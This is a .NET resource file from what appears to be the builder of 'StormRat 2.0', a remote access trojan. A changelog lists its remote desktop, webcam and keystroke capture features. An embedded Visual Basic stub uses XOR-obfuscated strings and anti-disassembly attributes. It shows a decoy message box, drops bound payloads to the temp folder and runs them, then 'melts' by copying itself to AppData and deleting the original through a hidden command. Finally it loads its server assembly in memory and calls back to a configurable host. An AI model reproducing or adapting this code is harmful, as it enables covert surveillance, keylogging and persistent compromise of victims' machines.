<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <data name="Updates" xml:space="preserve">
    <value>---------------------StormRat 2.0---------------------
- New name and theme
- Uses Codedom method instead of EOF method
- Remote Desktop includes remote keyboard
- Webcam speed enhanced
- File Manager includes quick access
- Fixed small file manager bug
- Fixed keystroke capture bug
- Fixed bug when saving settings
- Fixed a small profile bug
- No-IP Updater included</value>
  </data>
  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
  <data name="Archiver" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\Archiver.dll;System.Byte[], mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </data>
  <data name="Source" xml:space="preserve">
    <value>Imports System, System.Reflection, System.Windows.Forms, Microsoft.VisualBasic, System.IO, System.Diagnostics

&lt;Assembly: Runtime.CompilerServices.SuppressIldasm()&gt; 
&lt;Assembly: AssemblyTitle("*Title*")&gt; 
&lt;Assembly: AssemblyCompany("*Company*")&gt; 
&lt;Assembly: AssemblyProduct("*Product*")&gt; 
&lt;Assembly: AssemblyCopyright("*Copyright*")&gt; 
&lt;Assembly: AssemblyTrademark("*Trademark*")&gt; 
&lt;Assembly: AssemblyFileVersion("*Version*")&gt; 

Module Module1
    Dim q12p As Boolean = False, q13p As Boolean = False, q14p As Boolean = False
    Dim q20p As String = q5p("xzmomgIEoCOQxuJnJYDwstukiwEOEDyaPnzoLCEyJcnQskyYpCybgAJgPgyekGjdmflrmsAYJCkEyI", "2620060E15263600253B0D0B032906252A3059160C10")
    Sub Main()
        Dim q1p As New Threading.Thread(AddressOf q2p) : q1p.SetApartmentState(Threading.ApartmentState.STA) : q1p.Start()
    End Sub
    Sub q2p()
		Threading.Thread.Sleep(1000)
        Using q15p As New Threading.Mutex(False, "|MyMutex|")
			If Not q15p.WaitOne(0, False) Then End
			If q12p And Not Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) &amp; q20p Then 'Message
				MessageBox.Show("|MessageBoxText|", "|MessageBoxTitle|", MessageBoxButtons.OK, MessageBoxIcon.Information)
			End If
			If q13p And Not Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) &amp; q20p Then 'binder
				Dim q16p As New Resources.ResourceManager("|MyResourceFileName|", Assembly.GetExecutingAssembly)
				Dim q17p As Object = q16p.GetResourceSet(System.Globalization.CultureInfo.CurrentCulture, True, True)
				For Each q18p As System.Collections.DictionaryEntry In q17p
					Try
						If IO.File.Exists(System.IO.Path.GetTempPath &amp; q18p.Key) Then IO.File.Delete(System.IO.Path.GetTempPath &amp; q18p.Key)
						IO.File.WriteAllBytes(System.IO.Path.GetTempPath &amp; q18p.Key, DirectCast(Convert.FromBase64String(q16p.GetObject(q18p.Key)), Byte()))
						Process.Start(System.IO.Path.GetTempPath &amp; q18p.Key)
					Catch : End Try
				Next
			End If
			If q14p And Not Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) &amp; q20p Then 'Melt
				Try
					If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) &amp; q20p) Then File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) &amp; q20p)
					IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) &amp; q20p)
					Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) &amp; q20p)
					Dim q19p As ProcessStartInfo = New ProcessStartInfo()
					q19p.Arguments = q5p("LEThjJwJFKrvSGxBArVzWJrYnjUOghDDYNXdLBfEuNPwTuuGhrjxjVBchppIcvKkIsaTynX", "6A17481A23192D667A5C477D765673615F385A666A5F2E4E59657F57487A64173B34446A622220196E72") &amp; Application.ExecutablePath.ToString &amp; q5p("gGxhXIIvyRLXDeEXvPQWnzcgrfBtxzmomgIEoCOQxuJnJYDwstukiwEOEDyaPnzoLCEyJcn", "65")
					q19p.WindowStyle = ProcessWindowStyle.Hidden : q19p.CreateNoWindow = True
					q19p.FileName = q5p("JZFauwoxaBATHogeDJGkbRGRsszTlWvTrEsBCNDcFNgpLwlLuuhcRjjFjxcDcKOcVIWdTJnXhPZhzwjNJTYgQGSyEvtnLQcV", "392B055B12171D") : Process.Start(q19p) : End
				Catch : End Try
			End If
			Dim q3p As New Resources.ResourceManager("|StormServer|", Assembly.GetExecutingAssembly)
			Dim q4p As System.Reflection.Assembly = Assembly.Load(DirectCast(Assembly.Load(DirectCast(q3p.GetObject("|ArchiverResource|"), Byte())).GetType(q5p("IsCHFGiQLHLJygjKfiZQvpcbUAUoOckkxGJvpviFJ", "32312B2E2E1F3462002926090218")).GetMethod(q5p("OUrdAvRdYfjTeSeVOrbXhHXfdjfxKzKdOE", "1117072E1B22163C1519")).Invoke(Nothing, New Object() {q3p.GetObject("|ServerResource|")}), Byte()))
			Activator.CreateInstance(q4p.GetType(q5p("AvRdYfjTeSeVOrbXhHXfdjfxKzKdOEWuWPai", "05380033161A042B23032C2D27291F3B0D12370639252B1D3D0A"))).nClsBmSnpkiznPUcwlrgfhvLTPvbj("127.0.0.1", 12345, "|Identification|", "|Pass|", False, "|MyStartupKey|", False)
		End Using
    End Sub
    Public Function q5p(ByVal q6p As String, ByVal q7p As String) As String
        Dim q8p As String = ""
        Dim q9p As Integer
        Dim q10p As Integer
        For q11p As Long = 1 To (Len(q7p) / 2)
            q9p = Val("&amp;H" &amp; (Mid$(q7p, (2 * q11p) - 1, 2)))
            q10p = Asc(Mid$(q6p, ((q11p Mod Len(q6p)) + 1), 1))
            q8p += Chr(q9p Xor q10p)
        Next
        Return q8p
    End Function
End Module</value>
  </data>
  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
  <data name="StormServer" type="System.Resources.ResXFileRef, System.Windows.Forms">
    <value>..\Resources\StormServer.dll;System.Byte[], mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </data>
</root>